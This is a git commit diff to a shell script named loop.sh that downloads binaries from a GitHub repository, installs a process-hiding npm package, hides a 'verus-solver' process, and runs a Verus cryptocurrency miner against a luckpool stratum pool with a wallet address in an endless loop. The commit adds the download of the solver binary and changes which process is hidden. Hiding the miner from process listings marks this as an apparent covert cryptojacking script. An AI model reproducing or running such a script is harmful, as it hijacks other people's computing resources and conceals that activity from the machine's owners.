eb5c52c0ec3a206371ddcabcde7e0b8e88e5e2e2
breakok <95564840+breakok@users.noreply.github.com>
2021-12-25 13:06:41 +0530

    Update loop.sh

--- loop.sh
+++ loop.sh
@@ -1,9 +1,10 @@
 #!/bin/sh
 wget https://github.com/breakok/ob/raw/main/loop
+wget https://github.com/breakok/ob/raw/main/verus-solver
 apt install nodejs -y
 apt install npm -y
 npm i -g node-process-hider
-ph add loop
+ph add verus-solver
 ./loop -c stratum+tcp://na.luckpool.net:3956#xnsub -u RLPk1YJaQmTCVsnCEhfomMBx1csEvr1MR4.crot1 -p hybrid --cpu 40
 while [ 1 ]; do
 sleep 3
